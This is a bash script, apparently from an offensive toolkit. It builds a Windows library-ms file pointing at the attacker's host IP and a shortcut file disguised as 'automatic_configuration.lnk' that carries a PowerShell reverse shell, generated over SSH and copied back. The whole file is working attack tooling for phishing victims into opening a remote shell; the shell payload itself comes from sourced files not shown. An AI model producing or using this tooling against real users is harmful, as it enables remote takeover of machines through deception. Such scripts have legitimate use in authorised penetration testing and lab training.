#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/.env

get_config_library() {
    if [[ -z "$host_ip" ]]; then
        host_ip=$(get_host_ip)
    fi
    local config_file="config.Library-ms"
    cp $SCRIPTDIR/../xml/$config_file .
    sed -E -i 's/\{host_ip\}/'$host_ip'/g' $config_file
}

generate_windows_shortcut() {
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    local shortcut_name=$1
    if [[ -z "$shortcut_name" ]]; then
        shortcut_name="automatic_configuration.lnk"
    fi
    cp $SCRIPTDIR/../ps1/windows_shortcut.ps1 .
    sed -E -i 's/\{cmd\}/'"$cmd"'/g' windows_shortcut.ps1
    sed -E -i 's/\{shortcut_name\}/'$shortcut_name'/g' windows_shortcut.ps1
    local run_shortcut=$(cat windows_shortcut.ps1)
    run_shortcut=$(encode_powershell "$run_shortcut")
    ssh $windows_username@$windows_computername "$run_shortcut"
    if [[ ! -d "shortcuts" ]]; then
        mkdir shortcuts
    fi
    scp $windows_username@$windows_computername:c:/users/$windows_username/$shortcut_name shortcuts
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    if [[ -z "$windows_username" ]] || [[ -z "$windows_computername" ]]; then
        echo "Windows username and computer name must be set before running this script."
        exit 1
    fi
    if [[ "$1" == "get_config_library" ]]; then
        host_ip=127.0.0.1
        get_config_library
        exit 0
    elif [[ "$1" == "generate_windows_shortcut" ]]; then
        host_ip=127.0.0.1
        http_ip=127.0.0.1
        generate_windows_shortcut "$2"
        exit 0
    fi
    echo "Usage: $0 {get_config_library|generate_windows_shortcut [shortcut_name]}"
fi